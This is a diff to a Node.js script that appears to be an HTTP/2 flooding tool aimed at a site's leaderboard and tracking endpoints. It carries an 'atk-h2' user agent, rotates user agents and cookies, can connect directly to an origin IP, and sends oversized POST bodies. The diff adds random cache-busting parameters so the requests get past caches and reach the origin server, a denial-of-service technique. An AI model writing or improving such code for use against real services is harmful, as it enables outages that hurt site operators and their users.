@@ -39,6 +39,8 @@ const FAT=fat(12);
 
 function req(o={}){
   const {path='/api/health',method='GET',body=null,headers={},timeout=15000}=o;
+  let P=path;
+  if(P.indexOf('/api/economy/leaderboard')===0) P+=(P.indexOf('?')>=0?'&':'?')+'cb='+(Math.random()*1e9|0);
   return new Promise(res=>{
     const t0=performance.now();
     let fin=false;
@@ -47,7 +49,7 @@ function req(o={}){
     if(body!=null){ if(!h['content-type']&&!h['content-encoding'])h['content-type']='application/json';
       h['content-length']=Buffer.byteLength(body); }
     const done=v=>{if(fin)return;fin=true;clearTimeout(wd);res(v);};
-    const opt={host:DIRECT?IP:HOST,port:443,path,method,agent,headers:h,localAddress:LOCAL||undefined};
+    const opt={host:DIRECT?IP:HOST,port:443,path:P,method,agent,headers:h,localAddress:LOCAL||undefined};
     if(DIRECT)opt.servername=HOST;
     if(LOCAL){ opt.family = LOCAL.indexOf(':')>=0 ? 6 : 4; }
     const q=https.request(opt,s=>{
@@ -182,7 +184,7 @@ async function h2run(){
       const t0w=Date.now();
       try{
         sent++;
-        const st=conn.request({':method':MODE==='h2lb'?'GET':'POST',':path':MODE==='h2lb'?'/api/economy/leaderboard':'/api/track',':authority':HOST,'content-type':'application/json','user-agent':freshUA()||'atk-h2/1','accept-encoding':'identity','accept':'application/json, text/plain, */*',...(freshCookie()?{cookie:freshCookie()}:{})});
+        const st=conn.request({':method':MODE==='h2lb'?'GET':'POST',':path':MODE==='h2lb'?('/api/economy/leaderboard?cb='+(Math.random()*1e9|0)):'/api/track',':authority':HOST,'content-type':'application/json','user-agent':freshUA()||'atk-h2/1','accept-encoding':'identity','accept':'application/json, text/plain, */*',...(freshCookie()?{cookie:freshCookie()}:{})});
         const p=new Promise(res=>{st.on('response',h=>{st.resume();res(h[':status']);});st.on('error',()=>res('E'));st.on('close',()=>res('ABORT'));});
         if(MODE!=='h2lb'){ st.write(MODE==='h2trk'?FAT:tiny); } st.end();
         const c=await p; codes[c]=(codes[c]||0)+1;
